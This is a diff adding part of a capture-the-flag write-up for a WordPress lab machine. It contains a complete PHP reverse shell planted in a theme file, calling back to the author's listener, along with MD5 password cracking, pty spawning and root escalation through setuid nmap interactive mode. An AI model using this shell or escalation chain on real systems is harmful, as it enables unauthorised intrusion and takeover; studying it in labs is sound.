@@ -163,3 +163,248 @@ And we also get the information that in the file '/wp-links-opml.php' the *wordp
 </opml>
 ````
 
+We could search for exploits for this version, but I found the license file which contains a message:
+
+```
+curl -s http://10.10.176.240/license | tr -d "\n"
+what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?do you want a password or something?ZWxsaW90OkVSMjgtMDY1Mgo=
+```
+
+The ending '=' says that it could be a base64 encoded string:
+
+````
+echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
+elliot:ER28-0652
+````
+
+now we can go to the wordpress login under '/wp-login' and try the credentials. As we see it works!  
+Because we are an admin user we can go under 'Appearance > Editor' and edit the '404.php' on the right side.  
+First we start a netcat listener on port 4000:
+
+````shell
+nc -nlvp 4000
+listening on [any] 4000 ...
+````
+
+And we paste the reverse shell into the 404.php site:
+
+````php
+set_time_limit (0);
+$VERSION 	= "1.0";
+$ip 		= '10.9.205.135'; 	// Change Your {IP}
+$port 		= 4000;       	// Change Your {Port}
+$chunk_size 	= 1400;
+$write_a 	= null;
+$error_a 	= null;
+$shell 		= 'uname -a; w; id; /bin/sh -i';
+$daemon 	= 0;
+$debug 		= 0;
+
+if (function_exists('pcntl_fork')) {
+	$pid = pcntl_fork();
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	if ($pid) {
+		exit(0);
+	}
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+chdir("/");
+umask(0);
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+$descriptorspec = array(
+   0 => array("pipe", "r"),
+   1 => array("pipe", "w"),
+   2 => array("pipe", "w")
+);
+$process = proc_open($shell, $descriptorspec, $pipes);
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+printit("Successfully opened reverse shell to $ip:$port");
+while (1) {
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+````
+
+and now we should have a reverse shell in our netcat listener:
+
+````
+c -nlvp 4000
+listening on [any] 4000 ...
+connect to [10.9.205.135] from (UNKNOWN) [10.10.176.240] 38545
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 13:13:08 up 31 min,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+````
+
+We can now go into the home of the user robot and find the file 'key-2-of-3.txt'.  
+But we can not open it because we are the user deamon and not the user robot.  
+In the same folder we also find the file 'password.raw-md5'. The file contains:
+
+````
+robot:c3fcd3d76192e4007dfb496cca67e13b
+````
+
+We can use John the Ripper to crack the hash, or we can find the hash somewhere like here:  
+https://md5.gromweb.com/?md5=c3fcd3d76192e4007dfb496cca67e13b  
+
+Whe password for the user 'robot' is 'abcdefghijklmnopqrstuvwxyz'.
+
+we can now try to log in as that user and read the flag, but it doesn't work??
+
+````
+$ su robot
+su: must be run from a terminal
+````
+
+No problem. Lets see if we have python and then spawn a shell:
+
+````
+$ which python
+/usr/bin/python
+$ python -c 'import pty; pty.spawn("/bin/sh")'
+$
+````
+
+And now log in:
+
+````
+$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:~$
+````
+
+Now we can read the file and **collect the flag 2 of 3**!!
+
+For flag 3 it is likely that we have to be root and elevate our privileges.  
+Lets try it with:
+
+````
+obot@linux:~$ sudo -l
+sudo -l
+[sudo] password for robot: abcdefghijklmnopqrstuvwxyz
+
+Sorry, user robot may not run sudo on linux.
+````
+
+OK, let’s find what programs we have with the SETUID bit set owned by root:
+
+````
+find / -user root -perm -4000 -print 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+````
+
+Lets see what version nmap has, because in very old versions from 2.02 to 5.21 there was an interactive mode:
+
+````
+nmap --version            
+
+nmap version 3.81 ( http://www.insecure.org/nmap/ )
+````
+
+It is a very old version. My installed version is 7.92.  
+We now know that we can elevate our privileges with nmap:
+
+````
+robot@linux:/$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !whoami
+!whoami
+root
+waiting to reap child : No child processes
+nmap> 
+````
+
+Now we habe root privileges and can read the flag in the file key-3-of-3.txt:
+
+````
+nmap> !ls /root
+!ls /root
+firstboot_done	key-3-of-3.txt
+waiting to reap child : No child processes
+nmap> !cat /root/key-3-of-3.txt
+!cat /root/key-3-of-3.txt
+SomeFlagButFindItByYourself
+waiting to reap child : No child processes
+nmap>
+````
+
